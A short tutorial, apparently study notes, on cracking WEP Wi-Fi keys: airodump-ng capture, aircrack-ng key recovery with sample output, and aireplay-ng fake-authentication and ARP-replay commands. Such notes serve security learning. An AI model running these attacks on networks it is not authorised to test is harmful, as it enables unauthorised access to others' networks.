# WEP Cracking

For WEP cracking we need to follow a few simple steps

1. we need to capture enought data from router by running Targeted sniffing on the network and write it into some file. file with **.cap** extention is what we would need for next step
2. We need to run aircrack-ng on the file



> Command for targeted packet sniffing
> ```bash
> airodump-ng --bssid <AdoptarMac> --channel <networkChennel> --write <fileName> <InterfaceName>
> ``` 
files will be created with the extensions **.cap**, **csv**, **netxml**

Once we have the files we can run the following command for cracking

> Command for targeted packet sniffing
> ```bash
> aircrack-ng filename.cap
> ``` 
once the process is complete you will see some thing like

**KEY FOUND! [11:22:33:44:55] (ASCII: As23p)**
you can either use ASCII **As23p** to connect to the network

or

you can convert [11:22:33:44:55] into **1122334455** and use it to connect to the network
# Problem and solutions
What if the network is not busy and not generating any data
what sould we do.?
1. Become associated with the network using a fakeauth attack
 ```bash
aireplay-ng --fakeauth 0 -a <networkMac> -h <interfaceMAC> <InterfaceName>
 ``` 
2. Once you are associated with the adoptor now we need an **ARP replay**
attack

 ```bash
aireplay-ng --arpreplay -b <networkMac> -h <interfaceMAC> <InterfaceName>
 ``` 
This will generate new packets with new IV's used for WEP cracking.
